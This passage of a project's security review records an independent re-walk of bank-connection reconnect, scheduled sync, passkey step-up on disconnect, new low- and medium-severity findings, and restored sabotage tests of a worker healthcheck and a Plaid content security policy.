| sealed credential              | present (stale)   | present (**re-sealed**)     |
| connection status              | `reauth_required` | `active`                    |
| user overlay (note + category) | 1 row             | **1 row, byte-identical**   |

`account_balances` went 28 → 42: a third 14-row balance snapshot from the
post-reconnect sync. That table is append-only history, so growth is the correct
behaviour, not duplication.

Screenshots `d2-28-before-reconnect.png`, `d2-29-reconnect-dialog.png`,
`d2-30-reconnect-*.png`, `d2-31-reconnected.png`. Zero CSP violations throughout.

**Harness note (third Link trap).** Update mode _also_ opens on the phone-enrolment
consent pane, and its primary `#aut-button` is **disabled** until a phone number
is typed. A driver that clicks `#aut-button` — or any "Continue"-named button
without excluding `[disabled]` — hangs there forever on a pane that looks
interactive. The pane must be dismissed with `#aut-secondary-button`
("Continue without phone number"), and the password pane submitted through the
form (Enter in the `input[type=password]`), not through a guessed id.

#### Step 10 — a SCHEDULED worker sync, with no user action

Browser closed, no request from any client. Schedule shortened exactly as §8.6
did (`cron='* * * * *'`, `jitter_seconds=0`), then `sync_runs` polled:

```
t=5s  scheduled_runs=0
t=10s scheduled_runs=0
t=15s scheduled_runs=0
t=20s scheduled_runs=2      <- within ~20 s of the shortened schedule

 display_name    | provider    | trigger   | status  | operation    | error_kind
-----------------+-------------+-----------+---------+--------------+------------
 D2 statements   | file_import | scheduled | success |  transactions |
 Rental property | manual      | scheduled | success |  transactions |

connections after the run:
 D2 statements       | file_import | active
 First Platypus Bank | plaid       | active
 Rental property     | manual      | active
```

worker log:

```
sync skipped {"connectionId":"01a0ac63-76c3-…","reason":"min_interval"}
```

Two things the brief asked for, both answered:

- **Plaid was skipped**, by `min_interval`, because the reconnect sync had just
  run — the rate-limit ratchet doing its job, exactly as in §8.6.
- **Manual and CSV _ran_, and succeeded.** This is the load-bearing change since
  the re-gate. N-7's symptom — every scheduled run flipping both non-Plaid
  connections to a false, sticky "Needs reconnection" — **does not reproduce**,
  and it does not reproduce because the connections are genuinely syncable from
  the worker now (durable staging, `919902e`), not because they were filtered out
  of the fan-out. Both stayed `active`, both produced a `success` run, and the
  scheduled fan-out reaches every provider.

Schedule restored to `15 3 * * *` / 1200 s jitter afterwards, `next_run_at` cleared.

#### Step 11 — Disconnect, and the step-up that guards it

This reviewer deliberately **waited out the 300 s step-up freshness window**
before clicking Disconnect (polling `GET /api/auth/session` until
`"fresh":false`), so the mutation would be refused rather than sliding through on
a session that had just authenticated. It was:

```
DELETE /api/connections/{id} -> 403 {"code":"step_up_required",
    "detail":"This operation needs a recent passkey assertion. Call /auth/step-up/options."}
POST   /api/auth/step-up/options -> 200        <- real assertion on the virtual authenticator
POST   /api/auth/step-up/verify  -> 200 {"freshUntil":"2026-09-16T23:30:36.598Z"}
DELETE /api/connections/{id} -> 200 {"revokedAtProvider":true,"providerSlotMayRemain":false}
```

That is the step-up refusal **and** the real-ceremony retry, observed in a
browser against the deployed stack rather than in a unit test.

**Independently confirmed at Plaid**, with the access token stashed inside the
container before the disconnect and read back after (the stash lived in the
container's tmpfs and the probe deleted it itself):

```
BEFORE DISCONNECT: /item/get status=200 error_code=null            item_present=true
AFTER  DISCONNECT: /item/get status=400 error_code=ITEM_NOT_FOUND  item_present=false
stash deleted: true
```

Locally: `First Platypus Bank | plaid | disconnected`, **`sealed_credentials IS
NULL`**, and the **394 transactions retained as history**. Screenshots
`d2-32-before-disconnect.png`, `d2-33-disconnect-confirm.png`,
`d2-34-disconnected.png`.

**The Sandbox Item is removed**, so the teardown obligation is met.

### 9.9 D2-3 (LOW, new) — a Link "Success" that is never exchanged strands an Item at Plaid

Found by this reviewer's own first attempt at step 7 (§9.6, trap 2). Link reached
**Success** — which means Plaid has already created a real Item and a real
`public_token` — and the app never exchanged it, because `onSuccess` had not
fired yet. The browser was then closed.

The consequence is not local: locally there is simply no connection row, which is
clean. At **Plaid** there is now an Item that

- counts against the Sandbox Item quota,
- is invisible to this deployment (no row, no `access_token`), and
- **cannot be removed via `/item/remove`**, because that call needs the very
  `access_token` the un-exchanged `public_token` would have produced.

Per instruction it was **not** removed; it is recorded here so it is not a
surprise later. It can only be cleared from the Plaid dashboard.

The same shape in production is worse than in Sandbox: a user who closes the tab
between Link's Success and the app's exchange has granted an institution
connection that the app cannot see, cannot sync and cannot revoke — and, from the
bank's side, an authorisation that stays live. Two mitigations, in order of
preference:

1. **Exchange first, await nothing else.** `onSuccess` should `POST
/connections/plaid/exchange` as its very first statement, before any state
   update, navigation, toast or analytics `await`. (The step-up round trip is
   already inside that call, so this does not weaken the guard.)
2. Failing that, document the orphan path in `RUNBOOK.md` beside "What survives a
   disconnect", including that the only cleanup is the Plaid dashboard.

This is **LOW** as observed (Sandbox, one Item) but it is the only finding in this
walk with a real-money analogue, and it is cheap to close.

### 9.10 Sabotage log — the two close-out controls, broken on the running stack

Both breaks were made against the **live deployment**, not against a test, and
both were restored.

| #   | Control (condition)                                   | Break                                                                               | Result                                                                                                                                                                                                                                                                                                                             |
| --- | ----------------------------------------------------- | ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S1  | **Worker healthcheck that can fail (D-3, `05c09b5`)** | `kill -STOP` on the worker's node pid inside the container (`/proc/6/stat` → `T`)   | **RED.** First probe failure at ~22 s (`job-runner heartbeat missing or stale (age=21938ms max=15000ms)`), then 37 s, then 52 s; Docker marked the container **`unhealthy` at 60 s**. `kill -CONT` (`/proc/6/stat` → `R`) → **`healthy` again within 20 s**. This is the exact scenario N-4 hid behind 189 `healthy` restarts.     |
| S2  | **Plaid CSP gated on `PLAID_ENABLED` (C-2 / D-1)**    | `PLAID_ENABLED: 'false'` on `proxy` only in `compose.override.yml`; proxy recreated | **RED.** Headers collapsed to `script-src-elem 'self'`, `frame-src 'self'`, `connect-src 'self'`, `cross-origin-embedder-policy: require-corp`. In the browser: **exactly one `securitypolicyviolation` — `script-src-elem :: https://cdn.plaid.com/link/v2/stable/link-initialize.js`** — and **no Link iframe attached at all**. |

S2 is worth two extra sentences, because it is the control F-5 showed cannot be
measured carelessly. The block was recorded as a **fired event**, not as the
absence of an iframe: the same probe reports `violations=0` and a live
`link.html` frame when Plaid is enabled, and `violations=1` with zero frames when
it is not, so the signal distinguishes the two states in both directions. Note
also that `POST /api/connections/plaid/link-token` still returned **200** during
S2 — the api was left enabled on purpose — which proves the proxy's CSP, and not
an api feature flag, is what actually gates Link.

Restored: `PLAID_ENABLED: 'true'` on the proxy, proxy recreated, headers
re-verified live (`script-src-elem 'self' https://cdn.plaid.com`,
`cross-origin-embedder-policy: unsafe-none`), all five services healthy.

**One correction to `closeout-ops.md`'s wording, not a finding.** D-3's evidence
says the frozen worker "reads unhealthy in 10 s". What happens in 10–22 s is that
the _probe_ starts failing; Docker only transitions the container to `unhealthy`
after `retries: 3` at `interval: 15s`, i.e. **~60 s**. The control works; the
number in the evidence is the probe's latency, not the container's.

### 9.11 Conditions, and the Phase 1 status line

| #        | Condition                                   | Status after this re-walk                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| -------- | ------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **D-2**  | Independent re-walk of steps 7–11           | **CLOSED.** All eleven steps walked from `HEAD` by a reviewer who wrote none of the fixes: Link opened under the production CSP with zero violations and completed to exchange `201`; first sync 394 transactions + 14 balances; forced reauth → **Needs reconnection** → Reconnect `relinked:true` with zero data loss; a **scheduled** worker sync fired with no user action; disconnect confirmed at Plaid (`ITEM_NOT_FOUND`). Plus the regression of steps 1–6 and the api-restart durability check. |
| **D-3**  | Worker healthcheck that can fail            | **CLOSED**, sabotaged red on the running stack (S1).                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **D-4**  | `harden-secrets` + computed ownership check | **CLOSED** as far as this environment can show: `check-secret-ownership.sh` PASS on the real tree, all five `plaid_*`/custody secrets at the strict bar, and both api and worker read them with no `EACCES`. `just harden-secrets` itself needs a `sudo` this reviewer does not have.                                                                                                                                                                                                                    |
| **D-5**  | Durable staging for Manual/CSV              | **CLOSED**, and twice: a user-triggered sync after `docker compose restart api` succeeds with no duplicates, and the **scheduled** fan-out now syncs Manual and CSV successfully instead of marking them `reauth_required`. N-7 does not reproduce.                                                                                                                                                                                                                                                      |
| **D-6**  | Route the category taxonomy                 | **CLOSED at the UI, OPEN at install.** `GET /categories` is routed and `CategoryPicker` renders 133 options in 21 groups from the real taxonomy, and a pick persists. But on a fresh install the taxonomy is never seeded at all (**D2-1**), so a new deployment still gets N-3's empty picker until the api restarts.                                                                                                                                                                                   |
| **D-7**  | Layered compose override rendering          | **CLOSED** in use: the documented `compose.override.yml` workflow is exactly how Plaid was enabled here, and `docker compose config` rendered the layered result correctly on all three services.                                                                                                                                                                                                                                                                                                        |
| **D-1**  | Ratify the CSP/COEP trades                  | **OPEN — Chris + security.** Unchanged and not this reviewer's to close. Both trades were observed live: `cross-origin-embedder-policy: unsafe-none` and `style-src-elem 'self' 'unsafe-inline' https://cdn.plaid.com`, Plaid-enabled only, and S2 shows both revert cleanly when Plaid is off. D26 awaits ratification.                                                                                                                                                                                 |
| **C-1c** | Image closure in a real Actions run         | **OPEN — needs a remote.** Still no environment with one.                                                                                                                                                                                                                                                                                                                                                                                                                                                |

#### New findings from this walk

| id       | Severity | Finding                                                                                                                  | State                              |
| -------- | -------- | ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------- |
| **D2-1** | MEDIUM   | Fresh installs never seed the category taxonomy (`ensureTaxonomy` is boot-only; the RUNBOOK creates the user after boot) | Not fixed; exact diff in §9.4      |
| **D2-2** | LOW      | `POST /api/imports/csv` reports `staged: 0` for every first upload                                                       | Not fixed; diff site named in §9.5 |
| **D2-3** | LOW      | A Link "Success" whose `public_token` is never exchanged strands an unremovable Item at Plaid                            | Not fixed; two mitigations in §9.9 |

**Why D2-1 was not fixed in place.** The rule this reviewer was given allows a
Critical/High to be fixed in ≤30 lines _with a test_. D2-1 is MEDIUM, and more to
the point the correct fix site — `apps/api/src/bin/bootstrap-user.ts` — is a
top-level-await bin script with no seam a ≤30-line test can drive, while the
testable alternative (seeding lazily inside `GET /categories`) puts a write in a
read path and is an architecture decision, not a gate's. The diff is in §9.4 for
whoever owns it. That is the same reasoning §8.6 gave for leaving N-7 to the
connector-port owner, and that decision aged well.

#### PHASE 1 STATUS

**D-2 is closed. Phase 1's remaining conditions are D-1 (Chris's ratification of
D26) and C-1c (needs a remote), plus three new non-blocking findings — D2-1
(MEDIUM), D2-2 (LOW) and D2-3 (LOW) — none of which is a security defect and none
of which blocks exit.** The two carried-forward items that are not conditions are
unchanged: two _real_ institutions syncing on schedule, and a month of real data
with zero internal transfers, both of which need Chris's own accounts.

For the first time in this project, a reviewer who wrote none of the code
observed the whole Phase 1 path work on a stack built from `HEAD` — including the
two things the re-gate had to fix itself (the worker doing work, and Link
actually opening) and the two things the close-out agents built to fix what the
re-gate found (a healthcheck that fails, and staging that survives a restart).
Every one of them held under a break made by this reviewer.

### 9.12 Tree state, teardown and hygiene

```
$ git status --short          # this reviewer's changes only
 M docs/evidence/phase-1/gate-security-review.md      # this section
 M docs/plan/01-execution-log.md                      # one Phase 1 WP row
 M/?? docs/evidence/phase-1/screenshots/d2-*.png      # the walk
```

No source file was modified and no test added: nothing this walk found was a
Critical or a High, and the one MEDIUM's fix site is not testable in the budget
allowed (§9.11). `packages/contexts/recurring/**` also appears in `git status` —
**those are not this reviewer's** and were not touched, read or reverted; they
were present in the working tree from other Phase 2 work in flight.

**Stack teardown:** `docker compose down -v`. The `compose.override.yml` this
reviewer created was deleted. `.env` was never edited. The three
`secrets/plaid_*` files were left exactly as found (`-r-------- 10001 10001`,
mode `0400`) — confirmed by re-running `scripts/check-secret-ownership.sh`. The
nightly schedule was restored to `15 3 * * *` / 1200 s jitter before teardown.

**The Sandbox Item created by the completed walk was removed** and independently
confirmed gone at Plaid (`ITEM_NOT_FOUND`) _before_ teardown. One earlier Item,
created by the harness's incomplete first Link attempt, could not be removed and
is recorded as **D2-3**.

**Evidence hygiene.** The `just bootstrap-user` enrolment token was single-use and
is consumed; it is not in this document and every transcript containing it was
redacted at the shell before being read. No Plaid `client_id`, `secret`,
`access_token`, session cookie or CSRF token appears anywhere in §9 — the
`reset_login` and `/item/get` probes were written to run entirely inside the api
container and to print HTTP status codes and error codes only, and the token
stash they used lived in the container's tmpfs and was deleted by the probe
itself (verified: `stash deleted: true`). `ins_109508`, `user_good` and
`pass_good` are Plaid's published Sandbox test credentials. The `link-sandbox-…`
handles quoted here are the non-secret ids Link itself prints and are expired.

**The walk scripts** are in `/tmp/d2/` (`support.mjs`, `w1`–`w8`, `probe-*.mjs`,
`item-probe.mjs`, `reset-login.mjs`), deliberately outside the repo so `docs/`
needs no eslint widening for browser globals — the same choice §7 and §8.12 made.
They are run from `apps/web` so `@playwright/test` resolves.
